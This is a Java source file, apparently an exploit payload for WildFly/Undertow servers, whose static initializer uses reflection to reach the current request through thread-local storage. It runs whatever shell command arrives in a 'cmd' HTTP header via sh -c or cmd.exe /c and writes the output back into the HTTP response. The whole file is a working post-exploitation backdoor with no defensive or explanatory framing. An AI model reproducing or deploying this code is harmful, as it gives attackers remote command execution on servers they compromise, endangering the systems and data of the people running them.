package com.firebasky.exp;

/**
 * TargetObject = {java.lang.Thread}
 *   ---> threadLocals = {java.lang.ThreadLocal$ThreadLocalMap}
 *    ---> table = {class [Ljava.lang.ThreadLocal$ThreadLocalMap$Entry;}
 *     ---> [59] = {java.lang.ThreadLocal$ThreadLocalMap$Entry}
 *      ---> value = {io.undertow.servlet.handlers.ServletRequestContext}
 */

import java.lang.reflect.Method;

/**
 * WildFly 回显
 */
public class Echo_ServletRequestContext {
    static {
        try {
            getResponse();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void getResponse() throws Exception {
        Thread thread = Thread.currentThread();
        java.lang.reflect.Field threadLocals = Thread.class.getDeclaredField("threadLocals");
        threadLocals.setAccessible(true);
        Object threadLocalMap = threadLocals.get(thread);

        Class threadLocalMapClazz = Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
        java.lang.reflect.Field  tableField = threadLocalMapClazz.getDeclaredField("table");
        tableField.setAccessible(true);
        Object[] objects = (Object[]) tableField.get(threadLocalMap);

        Class entryClass = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
        java.lang.reflect.Field  entryValueField = entryClass.getDeclaredField("value");
        entryValueField.setAccessible(true);

        for (Object object : objects) {
            if (object != null) {
                Object valueObject = entryValueField.get(object);
                if (valueObject != null) {
                    if (valueObject.getClass().getName().equals("io.undertow.servlet.handlers.ServletRequestContext")) {
                        //response
                        Method getServletResponse = valueObject.getClass().getDeclaredMethod("getServletResponse");
                        getServletResponse.setAccessible(true);
                        Object response = getServletResponse.invoke(valueObject);
                        //request
                        Method getServletRequest = valueObject.getClass().getDeclaredMethod("getServletRequest");
                        getServletRequest.setAccessible(true);
                        Object request = getServletRequest.invoke(valueObject);
                        //echo
                        java.io.PrintWriter writer = (java.io.PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
                        Method getHeader = request.getClass().getMethod("getHeader",String.class);
                        String cmd1 = (String) getHeader.invoke(request, "cmd");
                        String[] cmd = !System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"sh", "-c", cmd1} : new String[]{"cmd.exe", "/c",cmd1};
                        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
                        java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
                        String output = s.hasNext() ? s.next() : "";
                        writer.write("by Firebasky:");
                        writer.write("\n"+output);
                        writer.close();
                    }
                }
            }
        }
    }
}
